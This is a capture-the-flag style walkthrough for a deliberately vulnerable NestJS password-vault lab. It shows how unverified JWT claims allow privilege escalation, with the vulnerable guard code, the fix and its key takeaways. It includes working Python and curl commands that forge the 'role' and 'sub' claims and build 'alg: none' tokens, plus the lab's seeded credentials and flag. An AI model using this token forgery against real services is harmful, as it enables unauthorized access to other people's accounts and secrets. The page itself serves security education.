# vaultpass: Solution / Walkthrough

![CWE-284](https://img.shields.io/badge/CWE--284-Broken%20Access%20Control-red?style=flat-square)
![Node](https://img.shields.io/badge/Node-NestJS-E0234E?style=flat-square&logo=nestjs&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**vaultpass is an intentionally vulnerable application built for security education.** It contains a deliberate [broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-284) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* broken authorization trust is and
*how* to approach the lab. This page is the spoiler half: the confirmed exploit,
the flag, and — most importantly — the **why** behind the bug and its fix. By
the end you should be able to:

- Read a NestJS guard and point to the exact missing signature check.
- Forge a JWT claim by hand and use it against a running API.
- Explain **why** one correct route did not make the others correct.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): a JWT's payload is
> just base64 text; its signature is the only reason to believe it. A server
> that reads the payload with `decode()` instead of `verify()` is trusting
> whatever claim the client cares to send.

<br>

## 🐛 The vulnerability

Login issues an HS256 token carrying the account's id, username and role
(`src/auth/token.ts`):

```ts
export function issueToken(user: { id: number; username: string; role: string }): string {
  return jwt.sign({ username: user.username, role: user.role }, config.jwtSecret, {
    algorithm: 'HS256',
    subject: String(user.id),
    expiresIn: config.jwtTtl,
  });
}
```

That part is fine. The problem is how most routes read the token back. There
are two ways to get claims out of a JWT, and they are not the same function:

```ts
// ⚠️ VULNERABLE: parses the payload, never looks at the signature, the
// algorithm, or the expiry. A client-edited token decodes just as happily as
// one this server issued.
export function readClaims(token: string): Claims | null {
  return toClaims(jwt.decode(token));
}

// SAFE: checks the HS256 signature against the server's secret, and pins the
// algorithm so `alg: none` is refused outright.
export function verifyClaims(token: string): Claims | null {
  try {
    return toClaims(jwt.verify(token, config.jwtSecret, { algorithms: ['HS256'] }));
  } catch {
    return null;
  }
}
```

`AuthGuard` and `AdminGuard` (`src/auth/guards.ts`) are both built on
`readClaims()`:

```ts
@Injectable()
export class AuthGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    const token = bearerToken(req.headers.authorization);
    const claims = readClaims(token);       // ⚠️ decode, not verify
    req.user = claims;
    return true;
  }
}

@Injectable()
export class AdminGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    if (req.user?.role !== 'admin') {       // ⚠️ compares an unverified claim
      throw new ForbiddenException('Administrator role required.');
    }
    return true;
  }
}
```

Walk through it the way the server does:

1. `AuthGuard` pulls the `Authorization: Bearer <token>` header and calls
   `readClaims()`, which is `jwt.decode()` under the hood — **no cryptographic
   check happens at all**.
2. Whatever `role` is sitting in the payload becomes `req.user.role`.
3. `AdminGuard` compares that value to `'admin'`. If the client put `"admin"`
   in the payload, the comparison passes.
4. `/api/vault/personal` has the same shape of bug one claim over: it reads
   the owner from `req.user.sub` — also unverified — so a forged `sub` reads
   someone else's personal items.

> **Why does it look safe?** The token really was signed with the server's
> secret at login — a real signature is sitting right there in the third
> segment. The bug is that almost nothing downstream ever asks whether that
> signature still matches the (possibly edited) payload in front of it.

<br>

## 💥 Exploitation

You log in as **alice** (`password123`), a `member`.

```bash
# 1) Log in and grab the token.
TOKEN=$(curl -s -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

# 2) As a member, the admin vault is forbidden.
curl -s -o /dev/null -w '%{http_code}\n' \
  -H "Authorization: Bearer $TOKEN" http://localhost:3000/api/admin/credentials
# 403
```

A JWT is `header.payload.signature`, each segment base64url — decode the
payload to see what the server believes about you:

```bash
python3 -c "
import sys, base64, json
p = '$TOKEN'.split('.')[1]
pad = p + '=' * (-len(p) % 4)
print(json.loads(base64.urlsafe_b64decode(pad)))
"
# {'username': 'alice', 'role': 'member', 'iat': ..., 'exp': ..., 'sub': '1'}
```

**Forge the claim, keep the original signature.** Edit `role` to `"admin"`,
re-encode just that segment, and splice it back between the unchanged header
and the unchanged (now mismatched, but never checked) signature:

```bash
FORGED=$(python3 - "$TOKEN" <<'PY'
import sys, base64, json
h, p, s = sys.argv[1].split('.')
pad = lambda x: x + '=' * (-len(x) % 4)
payload = json.loads(base64.urlsafe_b64decode(pad(p)))
payload['role'] = 'admin'
new_p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
print(f'{h}.{new_p}.{s}')
PY
)

curl -s -H "Authorization: Bearer $FORGED" http://localhost:3000/api/admin/credentials
```

Expected output (truncated), with the flag on the root recovery key:

```json
{
  "credentials": [
    { "id": 8, "visibility": "admin", "name": "Production database (read/write)", "secret": "prod-rw-Jx7!q2Lm-93aV", "...": "..." },
    { "id": 9, "visibility": "admin", "name": "Cloud billing root account", "secret": "billing-root-Qw8z-Lp40", "...": "..." },
    { "id": 10, "visibility": "admin", "name": "Root recovery key", "username": "root-recovery", "secret": "FLAG{VAULTPASS_FORGED_THE_CLAIM}", "...": "..." },
    { "id": 11, "visibility": "admin", "name": "SSO identity-provider admin", "secret": "idp-admin-Rt61-vN3s", "...": "..." }
  ]
}
```

You never needed alice's edited signature to match — nobody checked it.
`GET /api/admin/users` opens the same way, and shows every account's role.

**An even blunter version:** `alg: none` needs no signature at all.

```bash
NONE=$(python3 -c "
import base64, json
e = lambda d: base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode()).decode().rstrip('=')
print(e({'alg':'none','typ':'JWT'}) + '.' + e({'sub':'2','username':'bob','role':'admin'}) + '.')
")
curl -s -H "Authorization: Bearer $NONE" http://localhost:3000/api/admin/credentials
# 200 — same flag, and you never authenticated as anyone at all.
```

The `sub` claim gets the same treatment. Forge `sub` to `2` (bob) with `role`
left as `member`, and the "your own personal items" route hands you bob's:

```bash
curl -s -H "Authorization: Bearer $NONE_AS_MEMBER" http://localhost:3000/api/vault/personal
# bob's "Laptop disk-encryption PIN", never alice's
```

<br>

## 🚀 Going further

Seeded accounts: `alice` / `password123` (member), `bob` /
`correct-horse-battery-staple` (admin), `carol` / `hunter2hunter2` (member).

A hand-rolled `alg: none` token is the bluntest version of this bug — real
attacks are often subtler, e.g. a **mismatched algorithm (RS256 → HS256)**
confusion, where a library is tricked into verifying an HS256 signature using
the server's own *public* RSA key as the HMAC secret. The lesson is the same
either way: the moment code reads claims without validating the signature
*and* pinning the expected algorithm, the token is just client-supplied JSON.

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp and sign in as `alice` at
   <http://localhost:3000>. Find `POST /api/login` in **Proxy > HTTP history**
   and copy the `token` from the response.
2. Burp's **JWT Editor** extension (or just a base64 decoder) shows the header
   and payload. Edit the payload's `role` to `admin`, re-sign with "none" /
   leave the original signature, and copy the resulting token.
3. Send any `/api/admin/*` request to **Repeater**, replace the
   `Authorization: Bearer <token>` header with the forged one, and resend.
4. Confirm the contrast: send the same forged token against
   `GET /api/admin/audit` — it should fail, proving that route *does* check
   the signature while the others do not.

<br>

## 🛡️ The fix

Verify every token before trusting anything inside it — pin the algorithm so an
attacker cannot choose `none` or swap `RS256` for `HS256`:

```ts
// Always verify. Never decode-and-trust.
export function readClaims(token: string): Claims | null {
  try {
    return toClaims(jwt.verify(token, config.jwtSecret, { algorithms: ['HS256'] }));
  } catch {
    return null;
  }
}
```

With a single verifying implementation, `AuthGuard` and `AdminGuard` are
correct for free — the signature check happens once, in one place, and every
guard built on top of it inherits it. This is exactly what `VerifiedTokenGuard`
already does for `/api/admin/audit` in this lab; the fix is making *every*
guard use it instead of the `decode()`-based one.

For defence in depth: keep tokens short-lived (`config.jwtTtl`), rotate the
signing secret on compromise, and never let a client send `alg: none` — most
libraries let you pass an explicit allow-list of algorithms (as above), which
is the cheapest way to close that door for good.

Why this works: the signature is cryptographic proof that *this exact payload*
left the server unmodified. Checking it turns "whatever the client claims" back
into "whatever we actually issued" — which is the only thing authorization
should ever be based on.

### ⚠️ Tempting fixes that *don't* work

- **"Just check that a token exists."** That is `AuthGuard` today —
  authentication, not authorization. Any token, forged or not, satisfies it.
- **Blocklisting `alg: none`.** Better than nothing, but still decode-based
  thinking. The fix is verifying signatures with an allow-list of algorithms,
  not special-casing one bad value.
- **Hiding the role claim behind obfuscation (e.g. a numeric code instead of
  `"admin"`).** Raises the cost of *reading* the claim, not of *forging* it —
  you can set the obfuscated value to whatever you observed on a real admin
  token just as easily.
- **Storing the role in a separate, "more trustworthy" header.** Still
  client-supplied unless the server independently verifies it. The signature
  check is the only step that actually ties the payload to the server.
- **Checking the signature only on write routes.** `GET` routes that return
  secrets are exactly as sensitive as writes here — verify on every route that
  makes an authorization decision.

<br>

## 🎓 Key takeaways

If you remember five things from this lab, make it these:

1. **A JWT's payload is not proof of anything by itself.** Only a verified
   signature makes a claim trustworthy.
2. **`decode()` and `verify()` are different functions with similar names.**
   Know which one every piece of code that reads a token calls.
3. **Pin the algorithm when verifying.** Accepting whatever `alg` the token
   claims (including `none`) defeats the signature check entirely.
4. **One verifying route proves nothing about the rest.** Audit every guard
   that reads a token's claims, the same way you would audit every route that
   is supposed to check an owner id.
5. **Treat every claim in an unverified token as attacker-controlled input** —
   `role`, `sub`, and anything else you add later.

That's Level 9 — broken authorization trust via an unverified JWT claim.
Previously, **[opsdeck (Level 8)](https://github.com/iv0ks/opsdeck)** showed a
role check that only existed in the UI. Next in the series,
**[mirrorbox (Level 10)](https://github.com/iv0ks/mirrorbox)** is the capstone:
the same object exposed under four id formats at once, proving the disguise was
never the control. Head back to the **[Learning Guide](GUIDE.md)** for the
method, or the **[README](README.md)** for the lab setup.

<br>

> **Legal / ethics.** This is an educational, deliberately vulnerable lab. Run it
> only locally, on owned, isolated infrastructure, and never use these techniques
> against systems without explicit written authorization.
